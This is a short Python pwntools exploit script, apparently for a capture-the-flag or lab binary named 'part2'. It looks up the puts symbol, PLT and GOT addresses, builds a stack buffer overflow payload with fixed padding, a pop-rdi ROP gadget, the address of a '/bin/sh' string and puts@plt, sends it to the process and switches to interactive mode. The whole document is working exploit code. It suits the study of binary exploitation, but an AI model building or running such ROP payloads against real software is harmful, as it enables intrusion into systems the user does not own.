from pwn import *

context(log_level='debug')
elf = ELF("part2")
puts_sym = elf.sym['puts']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

print(hex(puts_sym))
print(hex(puts_plt))
print(hex(puts_got))

io = process("./part2")

offset = 0xa + 8
binsh = 0x402004
pop_rdi = 0x40119E

payload = b'a'*offset + p64(pop_rdi) + p64(binsh) + p64(puts_plt) 
# gdb.attach(io)
io.sendafter(b'Input', payload)

io.interactive()